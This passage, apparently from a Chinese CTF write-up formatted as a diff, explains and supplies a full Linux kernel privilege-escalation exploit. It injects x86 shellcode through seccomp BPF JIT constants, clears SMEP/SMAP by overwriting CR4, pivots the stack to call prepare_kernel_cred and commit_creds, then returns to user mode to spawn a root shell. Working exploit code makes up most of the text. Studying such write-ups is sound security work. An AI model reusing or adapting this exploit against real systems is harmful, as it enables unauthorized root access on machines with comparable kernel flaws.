@@ -1,0 +1,183 @@
+        syscall(1337, addr);
+    }
+    int main(){
+        ...;    //注入BPF
+        sys_seccon(0xffffffffc0000000+0x300);    //bpf_binary_header + 偏移, 偏移要>hole即可保证一定成功
+    }
+## 编写shellcode提权
+能够执行任意指令后, 先控制cr4关闭SMEP SMAP, 这样就可以进行ROP了, 下图为CR4寄存器的定义20 21位用于设置SMEP, SMAP,
+正常状态下cr4=0x3006f0, 我们只要将其设置为0x6F0即可.
+        //no SMEP, no SMAP
+        prog[start++].k = 0x3cc03148;   //xor rax, rax
+        prog[start++].k = 0x3c90f0b0;   //mov al, 0xf0
+        prog[start++].k = 0x3c9006b4;   //mov ah, 0x06
+        prog[start++].k = 0x3ce0220f;   //mov cr4, rax  ;cr4=0x6f0
+之后我们还需要调用commit_cred等函数, 需要8字节长的地址. JITed指令只有3字节, 无法写入8字节的立即数, 此时我们可以通过栈迁移,
+然后使用`pop rax; call rax`来进行调用.
+这里我选择从0x1000开始映射16页, 因为函数执行时需要栈空间. 然后把cred等8字节地址放入中间, 也就是0x8000. 这里要注意,
+mmap之后一定要写入一遍, 以保证确实分配了对应的页, 不然内核在访问时会导致缺页异常, 直接kernel crash.
+        //no SMEP, no SMAP
+        prog[start++].k = 0x3cc03148;   //xor rax, rax
+        prog[start++].k = 0x3c90f0b0;   //mov al, 0xf0
+        prog[start++].k = 0x3c9006b4;   //mov ah, 0x06
+        prog[start++].k = 0x3ce0220f;   //mov cr4, rax  ;cr4=0x6f0
+        //RSP=0x8000
+        prog[start++].k = 0x3cc03148;   //xor rax, rax
+        prog[start++].k = 0x3c9080b4;   //mov ah, 0x80  ;ax=0x8000
+        prog[start++].k = 0x3cc48948;   //mov rsp, rax  ;rsp=0x8000
+        //prepare_kernel_cred(0)
+        prog[start++].k = 0x3cff3148;   //xor rdi, rdi
+        prog[start++].k = 0x3c909058;   //pop rax;
+        prog[start++].k = 0x3c90d0ff;   //call rax
+        //commmit_creds(prepare_kernel_cred(0))
+        prog[start++].k = 0x3cc78948;   //mov rdi, rax
+        prog[start++].k = 0x3c909058;   //pop rax;
+        prog[start++].k = 0x3c90d0ff;   //call rax
+        //forge stack
+        uLL *stack = mmap(0x1000, PAGE_SIZE*0x10, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS |MAP_FIXED, -1, 0);
+        LOG(stack);
+        memset(0x1000, '\x00', PAGE_SIZE*0x10); //must POPULATE it !!!!!, 
+        int i=(0x8000-0x1000)/8;
+        //get root
+        stack[i++] = 0xffffffff81073c60;    //prepare_kernel_cred(0)
+        stack[i++] = 0xffffffff81073ad0;    //commit_creds(prepare_kernel_cred(0)
+在提权完毕后还需要考虑如何返回到用户空间, 我们不用手动执行swapgs, iret等,
+有一个函数叫`swapgs_restore_regs_and_return_to_usermode`, 其过程如下,
+我们可以跳转到`swapgs_restore_regs_and_return_to_usermode+0x16`的位置,
+同时在栈上布置好iretq的返回现场, 就可以. 详见完整EXP中
+## EXP
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    typedef unsigned long long uLL;
+    typedef long long LL;
+    #define PAGE_SIZE (0x1000)
+    #define LOG(val) printf("[%s][%s][%d]: %s=%p\n", __FILE__, __FUNCTION__, __LINE__, #val, val)
+    //通过seccomp注入BPF指令
+    void install_seccomp(char *insn, unsigned int len){
+        struct sock_fprog {
+           unsigned short      len;    /* 有多少条BPF程序 */
+           struct sock_filter *filter; /* 指向BPF指令数组 */
+        } prog;
+        prog.len = len;
+        prog.filter = insn;
+        if(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)<0){
+            perror("PR_SET_NO_NEW_PRIVS");
+            exit(-1);
+        }
+        if(prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)<0){
+            perror("PR_SET_SECCOMP");
+            exit(-1);
+        }
+    }
+    void sys_seccon(void *addr){
+        syscall(1337, addr);
+    }
+    //获取shell, 一定要设置argv与envp, 避免坑
+    static void getshell() {
+        char *argv[] = { "/bin/sh", NULL };
+        char *envp[] = { NULL };
+        execve("/bin/sh", argv, envp);
+    }
+    //保存用户态的一些寄存器, 用于iret返回
+    uLL user_cs, user_ss, user_sp, user_rflags;
+    static void save_state() {
+      asm(
+          "movq %%cs, %0\n"
+          "movq %%ss, %1\n"
+          "movq %%rsp, %2\n"
+          "pushfq\n"
+          "popq %3\n"
+          : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
+          :
+          : "memory");
+    }
+    int main(void)
+    {
+        save_state();
+        unsigned int prog_len = 0x1780/8;
+        //先构建一个程序,全部用nop填充, 以构建nop滑行, 绕过start的随机偏移
+        struct sock_filter *prog = malloc(prog_len*sizeof(struct sock_filter));
+        for(int i=0; i<prog_len; i++)
+        {
+            //ldw AX, 0x3c909090
+            prog[i].code = 0x00;  
+            prog[i].jt = 0x00;
+            prog[i].jf = 0x00;
+            prog[i].k = 0x3c909090; //fill with x86 ins nop. 
+        }
+        //最终总是返回ALLOW, 允许所有系统调用
+        prog[prog_len-1].code = 0x06;
+        prog[prog_len-1].jt = 0x00;
+        prog[prog_len-1].jf = 0x00;
+        prog[prog_len-1].k = 0x7FFF0000;  
+        int start = prog_len - 0x100;    //shellcode防止程序末尾
+        //关闭SMEP SMAP
+        prog[start++].k = 0x3cc03148;   //xor rax, rax
+        prog[start++].k = 0x3c90f0b0;   //mov al, 0xf0
+        prog[start++].k = 0x3c9006b4;   //mov ah, 0x06
+        prog[start++].k = 0x3ce0220f;   //mov cr4, rax  ;cr4=0x6f0
+        //栈迁移 RSP=0x8000
+        prog[start++].k = 0x3cc03148;   //xor rax, rax
+        prog[start++].k = 0x3c9080b4;   //mov ah, 0x80  ;ax=0x8000
+        prog[start++].k = 0x3cc48948;   //mov rsp, rax  ;rsp=0x8000
+        //prepare_kernel_cred(0)
+        prog[start++].k = 0x3cff3148;   //xor rdi, rdi
+        prog[start++].k = 0x3c909058;   //pop rax;
+        prog[start++].k = 0x3c90d0ff;   //call rax
+        //commmit_creds(prepare_kernel_cred(0))
+        prog[start++].k = 0x3cc78948;   //mov rdi, rax
+        prog[start++].k = 0x3c909058;   //pop rax;
+        prog[start++].k = 0x3c90d0ff;   //call rax
+        //返回用户态: jump to swapgs_restore_regs_and_return_to_usermode
+        prog[start++].k = 0x3c909058;   //pop rax;
+        prog[start++].k = 0x3c90e0ff;   //jmp rax
+        //映射一片内存作为内核的栈
+        uLL *stack = mmap(0x1000, PAGE_SIZE*0x10, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS |MAP_FIXED, -1, 0);
+        LOG(stack);
+        memset(0x1000, '\x00', PAGE_SIZE*0x10); //must POPULATE it !!!!!, 
+        int i=(0x8000-0x1000)/8;
+        //用于获取root权限
+        stack[i++] = 0xffffffff81073c60;    //prepare_kernel_cred()
+        stack[i++] = 0xffffffff81073ad0;    //commit_creds()
+        //返回到用户态
+        stack[i++] = 0xffffffff81800e10+0x16;    //swapgs_restore_regs_and_return_to_usermode+0x16
+        stack[i++] = 0x0;                     //padding
+        stack[i++] = 0x0;                     //padding
+        stack[i++] = getshell;              //rip
+        stack[i++] = user_cs;               //cs 
+        stack[i++] = user_rflags;           //rflag
+        stack[i++] = user_sp;              //rsp
+        stack[i++] = user_ss;               //ss
+        install_seccomp(prog, prog_len);
+        sys_seccon(0xffffffffc0000000+0x300);
+        getchar();
+    }
+    /*
+    def encode(s):
+        res = asm(s)[::-1]
+        for C in res:
+            print(hex(ord(C)))
+    */
